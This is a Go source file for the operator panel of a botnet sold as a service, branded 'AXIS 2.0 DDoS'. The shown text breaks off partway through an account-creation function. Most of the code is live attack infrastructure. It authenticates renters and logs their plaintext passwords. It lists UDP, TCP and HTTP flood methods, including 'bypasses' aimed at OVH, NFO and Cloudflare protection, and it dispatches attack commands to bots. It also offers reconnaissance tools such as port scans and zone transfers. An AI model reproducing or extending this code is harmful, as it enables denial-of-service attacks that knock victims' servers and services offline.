package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;32m             ╔═╗═╗ ╦╦╔═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;32m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
	this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
	this.conn.Write([]byte("\x1b[1;32m  go on and nuke your first victim\r\n"))
	this.conn.Write([]byte("\x1b[1;35mUsername\x1b[1;35m: \x1b[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;32mPassword\x1b[1;32m: \x1b[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[00;32mInvalid Credentials. AXIS On Ur Way!\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	// Log successful login
	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		log.SetOutput(loginLogsOutput)
		log.Printf("| successful login | username:%s | password:%s | ip:%s", username, password, this.conn.RemoteAddr())
	}

	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[90m                                  AXIS 2.0 DDoS from AXIS group\r\n"))

	// Start window title updater
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			title := fmt.Sprintf("\033]0; %d Bots | AXIS 2.0 | User: %s\007", BotCount, username)
			if userInfo.admin == 1 {
				title = fmt.Sprintf("\033]0; %d Bots | Admins: %d | Users: %d | Attacks: %d | AXIS 2.0 | %s\007",
					BotCount, database.totalAdmins(), database.totalUsers(), database.fetchAttacks(), username)
			}
			if _, err := this.conn.Write([]byte(title)); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i % 60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;32mAXIS\x1b[35m~# "))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		// Clear screen commands
		if cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[90m                                  AXIS 2.0 DDoS from AXIS group\r\n"))
			continue
		}

		// Help command - AXIS style
		if cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\x1b[1;90m            --> | Help | <--     \r\n"))
			this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ ports  \x1b[90m- \x1b[0mShows Ports                \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ bypass  \x1b[90m- \x1b[0mShows Bypass Commands     \x1b[1;32m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ methods \x1b[90m- \x1b[0mShows Attack Commands     \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ admin   \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;32m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╚═════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Admin command - AXIS style
		if userInfo.admin == 1 && (cmd == "ADMIN" || cmd == "admin") {
			this.conn.Write([]byte("\x1b[1;90m          --> | Admin HUB | <-- \r\n"))
			this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ adduser \x1b[90m- \x1b[0mCreate a Regular Account  \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ addadmin \x1b[90m- \x1b[0mCreate an Admin Account  \x1b[1;32m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ deluser \x1b[90m- \x1b[0mRemove an Account         \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Methods command - AXIS style with ALL methods
		if cmd == "METHODS" || cmd == "methods" {
			this.conn.Write([]byte("\x1b[1;90m                --> | Methods | <--                     \r\n"))
			this.conn.Write([]byte("\x1b[1;35m╔═══════════════════════════════════════════════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mUDP Floods:\x1b[1;32m                                        ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mudp\x1b[1;32m, \x1b[1;33mudpplain\x1b[1;32m, \x1b[1;33mstd\x1b[1;32m, \x1b[1;33mnudp\x1b[1;32m, \x1b[1;33mudphex\x1b[1;32m, \x1b[1;33msocket-raw\x1b[1;32m         ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mudp-strong\x1b[1;32m, \x1b[1;33mhex-flood\x1b[1;32m, \x1b[1;33mstrong-hex\x1b[1;32m, \x1b[1;33movhudp\x1b[1;32m, \x1b[1;33mcudp\x1b[1;32m, \x1b[1;33micee\x1b[1;32m      ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mrandhex\x1b[1;32m, \x1b[1;33movh\x1b[1;32m, \x1b[1;33movhdrop\x1b[1;32m, \x1b[1;33mnfo\x1b[1;32m, \x1b[1;33msamp\x1b[1;32m                     ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mTCP Floods:\x1b[1;32m                                        ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33msyn\x1b[1;32m, \x1b[1;33mack\x1b[1;32m, \x1b[1;33mstomp\x1b[1;32m, \x1b[1;33mhex\x1b[1;32m, \x1b[1;33mstdhex\x1b[1;32m, \x1b[1;33mxmas\x1b[1;32m          ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcpall\x1b[1;32m, \x1b[1;33mtcpfrag\x1b[1;32m, \x1b[1;33masyn\x1b[1;32m, \x1b[1;33musyn\x1b[1;32m, \x1b[1;33mackerpps\x1b[1;32m               ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp-mix\x1b[1;32m, \x1b[1;33mtcpbypass\x1b[1;32m, \x1b[1;33mnfolag\x1b[1;32m, \x1b[1;33movhnuke\x1b[1;32m, \x1b[1;33mraw\x1b[1;32m            ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mSpecial:\x1b[1;32m                                             ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mvse\x1b[1;32m, \x1b[1;33mdns\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m, \x1b[1;33mcf\x1b[1;32m                         ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mHTTP:\x1b[1;32m                                                ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33mhttps\x1b[1;32m                                       ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mudp <ip> <time> dport=<port>\x1b[1;32m              ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Bypass command - AXIS style with ALL bypasses
		if cmd == "bypass" || cmd == "BYPASS" {
			this.conn.Write([]byte("\x1b[1;90m                --> | Bypasses | <--                    \r\n"))
			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mcf [IP] [TIME] domain=[DOMAIN]\x1b[1;35m   - CF Bypass       ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mnfolag [IP] [TIME] dport=[PORT]\x1b[1;32m  - NFO Lag Bypass  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33movhnuke [IP] [TIME] dport=[PORT]\x1b[1;35m - OVH Nuke        ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33movh [IP] [TIME] dport=[PORT]\x1b[1;32m     - OVH Bypass      ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33movhudp [IP] [TIME] dport=[PORT]\x1b[1;35m  - OVH UDP Bypass  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33movhdrop [IP] [TIME] dport=[PORT]\x1b[1;32m - OVH Drop        ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mnfo [IP] [TIME] dport=[PORT]\x1b[1;35m     - NFO Bypass      ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mtcpbypass [IP] [TIME] dport=[PORT]\x1b[1;32m - TCP Bypass      ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mstomp [IP] [TIME] dport=[PORT]\x1b[1;35m   - TCP Stomp       ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╦═══════════════╦═════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ CF Port: 80   ║  AXIS 2.0     ║  --> | Rules | <--  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ NFO Port: 22  ║  FUCK ICE     ╠═════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ OVH Port: 995 ║  Made By AXIS ║  Don't spam!        ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╩═══════════════╣  Don't share!       ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ iplookup - Looks up an IP     ║  Don't Bother!      ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ portscan - Portscans an IP    ║                     ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m╚═══════════════════════════════╩═════════════════════╝\r\n"))
			continue
		}

		// Ports command - AXIS style
		if cmd == "PORTS" || cmd == "ports" {
			this.conn.Write([]byte("\x1b[1;90m     --> | Ports | <--               \r\n"))
			this.conn.Write([]byte("\x1b[1;32m╔═════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ PORT: 21 = SFTP         ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ PORT: 22 = SSH          ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ PORT: 23 = TELNET       ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ PORT: 25 = SMTP         ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ PORT: 53 = DNS          ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ PORT: 69 = TFTP         ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ PORT: 80 = HTTP         ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ PORT: 443 = HTTPS       ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ PORT: 3074 = XBOX       ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ PORT: 5060 = RTP        ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ PORT: 9307 = PLAYSTATION║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════╝\r\n"))
			continue
		}

		// Rules/Info command
		if cmd == "RULES" || cmd == "rules" || cmd == "INFO" || cmd == "info" {
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m \033[01;36m══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;37m" + username + "!\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont spam attacks! Dont share logins!\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont attack government targets!\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mAXIS 2.0 - Merged Edition\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mVersion\033[01;36m:\033[01;37m \033[01;37mv2.0\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;36m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
			continue
		}

		// Log command
		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			log.SetOutput(output)
			log.Printf("| username:%s | command:%s | ip:%s", username, cmd, this.conn.RemoteAddr())
		}

		// Handle bot count prefix
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mFailed to parse botcount \"%s\"\x1b[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte("\x1b[1;31mBot count exceeds your limit\x1b[0m\r\n"))
				continue
			}
			cmd = countSplit[1]
		} else {
			botCount = userInfo.maxBots
		}

		// Handle bot category prefix
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		// Parse and launch attack
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte("\x1b[1;32mAttack launched successfully!\x1b[0m\r\n"))
				} else {
					this.conn.Write([]byte("\x1b[1;31mTarget is whitelisted!\x1b[0m\r\n"))
				}
			}
		}

		// Admin commands
		if userInfo.admin == 1 {
			if cmd == "adduser" || cmd == "adduser" {
				this.handleAddUser(false)
				continue
			}
			if cmd == "addadmin" || cmd == "addadmin" {
				this.handleAddUser(true)
				continue
			}
			if cmd == "deluser" || cmd == "deluser" {
				this.handleRemoveUser()
				continue
			}
		}

		// Network tools - AXIS style
		if cmd == "IPLOOKUP" || cmd == "iplookup" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "PORTSCAN" || cmd == "portscan" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/WHOIS" || cmd == "/whois" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/PING" || cmd == "/ping" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResponse\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/traceroute" || cmd == "/TRACEROUTE" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/resolve" || cmd == "/RESOLVE" {
			this.conn.Write([]byte("\x1b[1;32mURL (Without www.)\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/reversedns" || cmd == "/REVERSEDNS" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/asnlookup" || cmd == "/asnlookup" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
			this.conn.Write([]byte("\x1b[1;32mIPv4 Or Website (Without www.)\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}
	}
}

func (this *Admin) handleAddUser(isAdmin bool) {
	this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
	new_un, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
	new_pw, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\x1b[1;32mBotcount (-1 for All):\x1b[0m "))
	max_bots_str, err := this.ReadLine(false)
	if err != nil {
		return
	}
	max_bots, err := strconv.Atoi(max_bots_str)
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mInvalid bot count\x1b[0m\r\n"))
		return
	}
	this.conn.Write([]byte("\x1b[1;32mAttack Duration (-1 for Unlimited):\x1b[0m "))
	duration_str, err := this.ReadLine(false)
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(duration_str)
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mInvalid duration\x1b[0m\r\n"))
		return
	}
	this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
	cooldown_str, err := this.ReadLine(false)
	if err != nil {
		return
	}
	cooldown, err := strconv.Atoi(cooldown_str)
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mInvalid cooldown\x1b[0m\r\n"))
		return
	}

	var success bool
	if isAdmin {
		success = database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown)
	} else {
